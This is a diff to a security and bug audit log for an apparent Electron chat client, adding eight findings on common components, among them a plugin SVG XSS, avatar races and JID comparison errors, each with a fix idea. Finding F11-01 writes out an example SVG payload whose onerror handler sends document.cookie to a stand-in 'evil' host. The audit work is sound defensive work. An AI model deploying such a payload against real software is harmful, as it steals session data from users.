@@ -21,7 +21,7 @@ Statuses: `TODO` · `IN PROGRESS` · `DONE (<n> findings)` · `BLOCKED`
 | F8 | AI chat UI | DONE (13 findings) | 2026-09-08 | 1 high, 6 med, 6 low — no stream abort on session switch (answer lost), citation IPC storm, per-keystroke key persist; markdown XSS checked clean |
 | F9 | Extensions / plugins UI | IN PROGRESS | 2026-09-08 | webview sandbox, plugin-supplied content |
 | F10 | Overlays & modals | DONE (13 findings) | 2026-09-08 | 6 med, 7 low — webview insecure-content pref, send/receive cross-wiring, no Escape/focus-trap on common modals, required-checkbox validation gap, optimistic-toggle no-revert |
-| F11 | Common components & utils | IN PROGRESS | 2026-09-08 | |
+| F11 | Common components & utils | DONE (8 findings) | 2026-09-08 | 1 high, 2 med, 5 low — plugin SVG XSS, stale avatar on chat switch, isSameJid LID/PN collision |
 | F12 | Cross-cutting pass | TODO | — | do only after F1–F11 |
 
 ## Summary counts
@@ -1326,7 +1326,125 @@ container so it can't cover the whole screen — cosmetic / robustness only.
 **Status:** open
 
 ## Slice F11 — Common components & utils
-_none yet_
+
+Files audited: `components/common/{ContextMenu,EmojiText,Versions,DefaultAvatars,ProfilePicture,PluginIcon,ProfilePicOverlay}.tsx`,
+`utils/{formatters,jidUtils,emojiUtils,emojiData,emojiKeywords,presenceUtils}.ts`.
+(`common/{ConfirmModal,SettingsModal}` → F10; `common/{WaveformPlayer,MessageStatusTick}` → F5;
+`window.electron` exposure behind `Versions.tsx` already recorded as F1-01.)
+
+### [F11-01] high — src/renderer/src/components/common/PluginIcon.tsx:27-46
+**What:** when a contribution/plugin supplies an `icon` string starting with
+`<svg`, `PluginIcon` injects it via `dangerouslySetInnerHTML` after a regex that
+only strips `width`/`height` and adds a `style` attr — **no sanitization** of
+script/event-handler content.
+**Why it's a bug:** plugin manifest values reach this component (menu items,
+sidebar indicators, panel icons). A manifest icon like
+`<svg><image href="x" onerror="fetch('//evil/'+document.cookie)"></svg>` or an
+`onload`/`onbegin` handler on a nested SVG element executes script in the
+renderer origin the moment the icon mounts (event-handler attributes fire on
+`innerHTML`-inserted SVG even though a bare `<script>` would not). Any installed
+plugin — or a malicious/typo-squatted one — gets renderer-origin code exec,
+which via the F1-01 `window.electron` surface is effectively full IPC access.
+**Fix idea:** sanitize with DOMPurify (`USE_PROFILES: { svg: true, svgFilters: true }`)
+before injecting, or render plugin SVGs in a sandboxed `<img src="data:image/svg+xml,…">`
+(which does not execute script), or only accept a fixed Lucide-name / URL icon
+and drop the raw-SVG path.
+**Status:** open
+
+### [F11-02] med — src/renderer/src/components/common/ProfilePicture.tsx:35-47
+**What:** the preview-fetch effect (`api.getProfilePicture(jid,'preview')` →
+`setUrl`) has no check that `jid` is still current when the IPC resolves and no
+AbortController; `handleImageError` likewise `await`s then `setUrl` with no
+guard. The component is a long-lived single instance in the chat header /
+message rows (reused across chat switches, not keyed by jid there).
+**Why it's a bug:** open contact A (no cached url) then switch to contact B
+before A's `getProfilePicture` resolves → A's preview URL resolves last and
+`setUrl` paints A's photo as B's avatar in B's header, until something else
+refreshes it. Same class as the F3 out-of-order bugs. Also setState-after-unmount
+warnings on fast switching.
+**Fix idea:** capture `jid` at call time and bail in the `.then` if
+`jid !== <current jid ref>`; or add an `alive` flag cleared in cleanup.
+**Status:** open
+
+### [F11-03] med — src/renderer/src/utils/jidUtils.ts:6-11
+**What:** `isSameJid` compares only the identifier part (`split('@')[0].split(':')[0]`)
+and ignores the domain, so `12345@lid` is reported equal to `12345@s.whatsapp.net`.
+LID identifiers and phone numbers are **different namespaces** — the same numeric
+string in each refers to unrelated users.
+**Why it's a bug:** `isSameJid` gates "is this me" / "is this the same
+participant" checks across reactions, mentions, quoted-message ownership, presence
+(F3-07 fix also routes through here). A collision between someone's `@lid` value
+and another contact's phone number → the app can mis-attribute a reaction/quote
+to you or to the wrong member, highlight the wrong mention, etc.
+**Fix idea:** only treat identifiers as comparable when the domains are the same
+kind, or resolve LID↔PN via the mapping the backend already maintains before
+comparing; at minimum require `domain1 === domain2` unless one side is explicitly
+a known LID alias of the other.
+**Status:** open
+
+### [F11-04] low — src/renderer/src/components/common/DefaultAvatars.tsx:15-22
+**What:** `getAvatarColor` does `Math.abs(hash) % DEFAULT_AVATAR_COLORS.length`
+on a 32-bit-wrapped hash. `Math.abs(-2147483648)` is still `-2147483648`, so a
+jid whose hash lands on `INT_MIN` yields a negative index →
+`DEFAULT_AVATAR_COLORS[negative]` is `undefined` → `colorScheme.bg` /
+`colorScheme.fg` throws in `ProfilePicture` (no error boundary around the header
+avatar).
+**Why it's a bug:** astronomically rare but a hard crash of the avatar subtree
+when it happens, with no recovery.
+**Fix idea:** `((hash % n) + n) % n`, or `(hash >>> 0) % n`.
+**Status:** open
+
+### [F11-05] low — src/renderer/src/components/common/ProfilePicOverlay.tsx:35-71
+**What:** (a) the "click outside to close" catcher is
+`<div className="absolute inset-0 -z-10" onClick={onClose} />` — it sits *behind*
+the parent `fixed inset-0 bg-black/80` element, which has no click handler, so
+clicking the dimmed backdrop does nothing; only the small X button closes it.
+(b) No `Escape` handler, no focus trap, no focus restore, no `role="dialog"`.
+(c) `fetchImage` `setImageUrl`/`setLoading` run with no mounted guard.
+**Why it's a bug:** the expected "tap anywhere to dismiss" gesture is dead;
+keyboard users have only the X button and focus is left behind the overlay.
+**Fix idea:** move `onClick={onClose}` onto the visible backdrop element (and
+`stopPropagation` on the inner content), add an `Escape` listener + focus
+trap/restore (F10 owns the shared modal primitive), guard the fetch.
+**Status:** open
+
+### [F11-06] low — src/renderer/src/components/common/ContextMenu.tsx:79-81,169-183,45-67
+**What:** (a) list rows use `key={idx}` (fine while items are static, fragile if a
+menu ever filters/reorders items — wrong row state/submenu reused). (b) No
+`Escape`-to-close (only outside-click and scroll). (c) Submenus open on
+`mouseenter` only — no keyboard path and nothing on touch/no-hover; the parent
+row's `onClick` just `stopPropagation`s. (d) The reposition effect deps include
+`items`; callers passing an inline `items={[…]}` array re-run
+`getBoundingClientRect` + `setCoords` every parent render.
+**Why it's a bug:** keyboard-only users cannot reach submenu actions or dismiss
+the menu with `Escape`; minor churn for inline-array callers.
+**Fix idea:** stable keys from `item.label`; add an `Escape` handler to
+`onClose`; open submenu on focus/Enter too; memoize or accept that `items` should
+be stable.
+**Status:** open
+
+### [F11-07] low — src/renderer/src/utils/formatters.ts:1-50
+**What:** all `format*` helpers do `Number(ts) * 1000`, assuming a **seconds**
+epoch. Several backend fields (edit timestamps, some receipt payloads) are
+milliseconds. A ms value renders a date ~year 50000; a seconds value passed where
+ms is expected renders 1970. `formatDate` also omits the year, so a message from
+a previous year shows an ambiguous "Monday, March 3".
+**Why it's a bug:** wrong/absurd timestamps shown when a caller passes the wrong
+unit; no year on older separators.
+**Fix idea:** normalize the unit centrally (`ts > 1e12 ? ts : ts*1000`), and
+append the year in `formatDate` when `date.getFullYear() !== now.getFullYear()`.
+**Status:** open
+
+### [F11-08] low — src/renderer/src/components/common/PluginIcon.tsx:49-58
+**What:** the image-URL branch renders `<img src={trimmed}>` for any
+`http://` / `https://` / `data:image/` plugin icon with no allowlist.
+**Why it's a bug:** a plugin icon pointing at a remote `http(s)` URL is a
+load-time beacon (the plugin author learns when/where the app renders, plus the
+user's IP) and `http://` is mixed content. Minor next to F11-01 but same
+untrusted-input source.
+**Fix idea:** restrict plugin icons to `data:` URIs (bundled) or a documented
+asset scheme; block bare `http:`.
+**Status:** open
 
 ## Slice F12 — Cross-cutting pass
 _none yet_
